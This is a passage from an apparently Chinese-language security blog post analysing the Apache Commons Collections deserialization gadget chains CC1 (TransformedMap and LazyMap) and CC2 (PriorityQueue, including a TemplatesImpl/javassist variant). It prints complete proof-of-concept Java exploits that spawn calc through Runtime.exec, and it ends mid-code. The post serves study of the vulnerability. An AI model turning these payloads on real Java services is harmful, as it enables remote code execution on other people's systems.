class="line"></span><br><span class="line">     return object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是把传入的多个Transfomer类的transformer方法依次执行，每个transformer方法执行后返回的对象会被当做下一次执行的时候传入的参数。</p><p>通过以上信息，我们就可以清晰的看懂上面的payload了。<br>先通过ConstantTransformer获得 Runtime类，再通过InvokerTransformer执行exec方法，然后通过ChainedTransformer将两个类串起来，让InvokerTransformer以ConstantTrasformer返回的Runtime类为参数执行exec方法，达到RCE的目的。</p><h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><p>触发，我们选择的地方是sun.reflect.annotation.AnnotationInvocationHandler的readObject方法（注意8u71以下才能有触发点，之后的版本已被修复）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150130.png" alt="QQ截图20210217150130"></p><p>触发点代码。<br>我们可以发现，它对传入的map的每一个value执行了setValue。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150142.png" alt="QQ截图20210217150142"></p><p>可以很明显的发现会对值进行transform方法。也就是相当于触发了一次Map.put()。接下来，就是payload构造时间了。</p><p>但是 AnnotationInvocationHandler 是内部类无法直接实例化，但它的父类InvocationHandler可以，我们可以通过反射得到 AnnotationInvocationHandler 构造方法，然后对其使用newInstance再向上转型为父类 InvocationHandler 。既然要获得对象，我们就应该关注一下它的构造方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 &#x3D; var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length &#x3D;&#x3D; 1 &amp;&amp; var3[0] &#x3D;&#x3D; Annotation.class) &#123;</span><br><span class="line">        this.type &#x3D; var1;</span><br><span class="line">        this.memberValues &#x3D; var2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要传入两个参数，var2不用说了就是我们传入的Map，var1呢？是Annotation类，即所有注释类的接口。我们必须在此处传入一个注释类才能使if判断为真，才能把我们的参数中的Map传入。<br>但是并不是所有注释类传进去都有效，注释类（实际上就是接口）必须有定义的方法才能正常触发反序列化。关于此点我们后面再详细谈谈。</p><p>因为再readObject方法里我们会执行**Map var3 = var2.memberTypes()**，我们看看memberTypes源码。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211027185805731.png" alt="image-20211027185805731"></p><p>发现是返回构造方法中定义好的memberTypes属性。而这个memberTypes属性又和上一行的var2属性有关，var2属性又与getDecalredMethods有关…因此我才猜测 “注释类必须有定义的方法才能正常触发反序列化 “,实际结果确实如此。<br>目前找到的能够正常触发漏洞的注释类有 Target Retention SuppressWarnings .无一例外他们作为接口都定义了方法。而且在我翻阅一些参考文档后，发现确实是这样</p><p>另外一点需要注明的是，Runtime类没有继承Serialize接口，也就是说它不能被直接序列化。<br>也就是说如果我们在transformer链里想直接通过有*<em>new ConstantTransformer(Runtime.\</em>getRuntime*())**来获取Runtime对象时，会反序列化失败。<br>但是Class类是有继承Serialize接口的，我们可以通过transformer链和反射来在反序列化阶段逐步创建Runtime类，继而解决这个问题</p><p>总结一下几个坑点：<br>1.Runtime类不能被序列化<br>\2. AnnotationInvocationHandler 无法直接实例化，可通过反射获得对象<br>3.注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类<br>OK，以上知道了后就能试着写一下payload了（这个payload依旧不能正常执行，错误出处间代码注释，具体原因看下文）。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;new String(&quot;getRuntime&quot;),new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;calc.exe&quot;)&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            innermap.put(&quot;sc&quot;,&quot;b&quot;);  &#x2F;&#x2F;不能执行的原因在这里，如果是put(&quot;value&quot;,&quot;a&quot;)就可以正常执行</span><br><span class="line">            Map outmap &#x3D; TransformedMap.decorate(innermap,null,chain);</span><br><span class="line"></span><br><span class="line">            Class Annotation &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor AnnotationCons &#x3D; Annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            AnnotationCons.setAccessible(true);</span><br><span class="line">            InvocationHandler InvocationHandler &#x3D; (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap);</span><br><span class="line"></span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));</span><br><span class="line">            a.writeObject(InvocationHandler);</span><br><span class="line">            a.close();</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">            b.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么不能执行，这原因与上面提到的“ 注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类 ”很有关联。<br>因为涉及JVM的一些东西，我们不会怎么去深究，就是浅浅的看一下，做出一些推测。</p><p>首先我们关注到 AnnotationInvocationHandler 的readObject。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150215.png" alt="QQ截图20210217150215"></p><p>接下来就是复杂的推理了，建议先把各方法的意义弄明白<br>发现必须要var7！=null才能正常触发反序列化漏洞，那么var7的来源是从(Map)var3中获得以(String)var6为键名的值。var6是var3中一项的键名。而var3的来源是(Annotation)var2的menberTypes,我们跟进这个方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150244.png" alt="QQ截图20210217150244"></p><p>那么var1就是AnnotationInvocationHandler的type属性了，而这个type属性在其构造方法中就定义好了，是传入的注释类。<br>也就是说var1就是我们在实例 AnnotationInvocationHandler 时传入的注释类。<br>结合以上流程，我们就可以知道这个过程是:<br>从 实例 AnnotationInvocationHandler 时传入的注释类 中获取最后一个方法，然后把它编入为一个HashMap(以下称为注释方法Map)的一个键名并给予值。在readObject时会遍历传入的Map，如果在传入的Map中找到了一项的键名在注释方法Map中存在（即 在传入的Map中找到了一项的键名与实例化时传入的注释类的最后一个方法同名），则if条件为真，攻击成功。<br>所以上面为什么put(“value”,任意)才能达成攻击的原因是， Target Retention SuppressWarnings 这三个注释类都有且只有一个方法名为value的方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150343.png" alt="QQ截图20210217150343"></p><p>分析完了。这个洞利用版本只能在8u71以前，比较古老无用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>AnnotationInvocationHandler.readObject 会调用传入的map中每一个value的transformer方法，我们可以通过ConstantTrasformer和InvokerTransformer组合为一个ChainedTransformer来逐步还原Runtime类并调用其exec方法实现命令执行。</p><p>ConstantTransformer.transformer是返回传入的类，InvokerTransformer.transformer是通过反射对传入的方法名参数名等进行调用，ChainedTransformer.transformer是将传入的transformer方法按顺序执行，并将上一个方法执行结果做参数传递给下一个方法。</p><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="RCE原理-1"><a href="#RCE原理-1" class="headerlink" title="RCE原理"></a>RCE原理</h3><p>LazyMap的获得方法和TransfromerMap差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    Map innerMap &#x3D; new HashMap();</span><br><span class="line">    Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    if (!super.map.containsKey(key)) &#123;</span><br><span class="line">        Object value &#x3D; this.factory.transform(key);</span><br><span class="line">        super.map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return super.map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在对LazyMap使用get方法时，它会执行this.factory.transform(key),而this.factory.transform如果去跟进分析的话，实质上就是调用我们在decorate传进去的Transformer类。</p><h3 id="触发-1"><a href="#触发-1" class="headerlink" title="触发"></a>触发</h3><p>LazyMap的触发点也在 AnnotationInvocationHandler 中，但不是在readObject方法，而是在invoke方法。invoke方法中有一行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object var6 &#x3D; this.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p>其中this.memberVales是在构造方法中定义为传入的Map。</p><p>那么invoke方法要怎么才能触发呢？答案是动态代理。<br>熟悉动态代理的朋友肯定直到，invoke方法是动态代理中的一个特殊的方法，在代理类中无论执行什么方法，实质上都是在执行invoke方法。</p><p>那么接下来就是骚思路了：<br>我们通过反射和向上转型得到一个 <strong>AnnotationInvocationHandler(Class var1, Map var2)</strong> 对象。<br>构建一个Map的代理类，其第三个参数是刚刚得到的 <strong>AnnotationInvocationHandler</strong> 对象，再故技重施将其通过向上转型得到一个 <strong>AnnotationInvocationHandler</strong> 对象。当该对象反序列化执行readObjct方法时，会执行以下entryset方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150359.png" alt="QQ截图20210217150359"></p><p>本质上来说，是对一个代理类执行了一下entrySet方法，即执行了代理类的invoke方法，又因为代理类的第三个参数填入的是 <strong>AnnotationInvocationHandler</strong> 对象，其内部已经写好了invoke方法，所以此处执行的代理类的invoke方法即 <strong>AnnotationInvocationHandler</strong> 对象的invoke方法，继而触发了get方法，继而触发了漏洞。这是一个很妙的地方</p><p>多说无益，整paylaod吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">            org.apache.commons.collections.Transformer[] transformers &#x3D; new org.apache.commons.collections.Transformer[]&#123;</span><br><span class="line">                    &#x2F;&#x2F; 包装对象</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;getRuntime&quot;,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                            null,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;calc&quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            Map outermap &#x3D; LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            cons.setAccessible(true);</span><br><span class="line">&#x2F;&#x2F;妙处</span><br><span class="line">            InvocationHandler handler &#x3D; (InvocationHandler) cons.newInstance(Override.class,outermap);&#x2F;&#x2F;获得一个AnnotationInvocationHandler对象</span><br><span class="line">            Map Prox &#x3D; (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);&#x2F;&#x2F;创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法</span><br><span class="line">            InvocationHandler handler1 &#x3D; (InvocationHandler) cons.newInstance(Override.class,Prox);  &#x2F;&#x2F;将代理Map传入，当代理Map被执行任一方法时，执行invoke方法</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;));</span><br><span class="line">            a.writeObject(handler1);</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>目的就是为了执行AnnotationInvocationHandler 的invoke方法，我们通过实例化一个AnnotationInvocationHandler（A1） 类并在实例化时的参数中加入传入了LazyMap的AnnotationInvocationHandler（AP） 类的动态代理，在A1构造方法中会有一个AP.entryset的代码，从而触发的AP.invoke。</p><h1 id="Apache-Commons-Collections-2"><a href="#Apache-Commons-Collections-2" class="headerlink" title="Apache-Commons-Collections 2"></a>Apache-Commons-Collections 2</h1><p>cc链2 主要是PriorityQueue和commons-collections-4.0 组件 造成的Gadget。</p><p>PriorityQueue 是一个用于大小排序的类，它会将传入的数值进行大小排序。</p><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>CommonsCollections 4.0<br>需要有 javasist 依赖<br>JDK版本暂无限制</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h2><p>PriorityQueue +ChianedTransfomer+反射修改属性</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            PriorityQueue.readObject()</span><br><span class="line">            PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">            PriorityQueue.siftDownUsingComparator();</span><br><span class="line">              TransformingComparator.compare()</span><br><span class="line">                  InvokerTransformer.transform()</span><br><span class="line">                      Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接跟着POC调试。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image.png"></p><p>我们根据利用链跟进到PriorityQueue.readObject</p><p>这里先循环调用readObject将反序列化结果放入queue数组，然后可以发现这里最后调用了一个heapify()方法，我们跟进。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_1.png"></p><p>这里的意思对我们来说便是，如果size大于1便调用siftDown方法处理queue数组。跟进siftDown</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_2.png"></p><p>会发现此处会判断comparator是否存在，若存在则调用siftDownUsingComparator。链中是需要跟进siftDownUsingComparator方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_3.png"></p><p>siftDownUsingComparator里有个comparator.compare(x, (E) c),其中这个x是我们可控的，就是我们往queue中put的值。跟进compare方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_4.png"></p><p>可以发现是调用了当前transformer指定的类的transform方法，而当前transform按照POC中来看便是ChainedTransformer chain，于是此处便会调用ChainedTransformer的transform方法，我们在ChainedTransformer中写入的命令就会被执行了。</p><p>这便是这个链的大体状况，但是这个POC中仍然有一些细节需要推敲。</p><h3 id="POC分析-1"><a href="#POC分析-1" class="headerlink" title="POC分析 1"></a>POC分析 1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>这里向queue中add了两个元素，这里add了两个元素的意义是这样的：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_5.png"></p><p>在heapify会判断queue中的值是否大于1，只有大于1才会执行siftDown方法。</p><h3 id="POC分析-2"><a href="#POC分析-2" class="headerlink" title="POC分析 2"></a>POC分析 2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Field field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(queue,comparator);</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_6.png"></p><p>我们可以发现在POC此处在实例化PriorityQueue时并没有传入comparotor，而是在后面使用反射给comparator变量赋值。我们跟进queue.add便可一览究竟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_7.png"></p><p>add在实际上是调用了offer方法，跟进offer方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_8.png"></p><p>可以发现这个offer方法也调用了siftUp这个方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_9.png"></p><p>跟进后自然是来到此处，如果comparator存在它便会走上面的分支，调用transformer方法，走下面便是进行赋值操作。</p><p>假如此时comparator存在走了上面的分支，</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_10.png"></p><p>便会在此行产生报错，这里的逻辑是将queue数组中的两个值进行transform处理然后进行大小比较以排序，但是这里两个transform方法返回的结果均为ProccessImpl对象，不能被compare方法调用进行大小比较，所以会产生报错。导致我们后面的序列化操作不能顺利执行，无法产生payload。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_11.png"></p><h2 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h2><p>链2用到了PriorityQueue +TemplatesImpl  +InvokerTransformer和javassist技术。<br>javassist 可以用来动态修改java字节码，相关细节这里就不细说了，我的博客和网上均有大量文章。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            PriorityQueue.readObject()</span><br><span class="line">            PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">            PriorityQueue.siftDownUsingComparator()</span><br><span class="line">              TransformingComparator.compare()</span><br><span class="line">                  InvokerTransformer.transform()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                  TemplatesImpl.getTransletInstance()</span><br><span class="line">                    EvilClass.newInstance()</span><br><span class="line">                  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于TemplatesImpl  ，它也是7u21链中不可或缺的一个环节，它配合javassist起到任意类生成的作用，在该条链中可以再配合invokerTransformer来达到命令执行的目的。</p><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator Tcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//cc.writeFile();</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;blckder02&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        Field queue_field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span 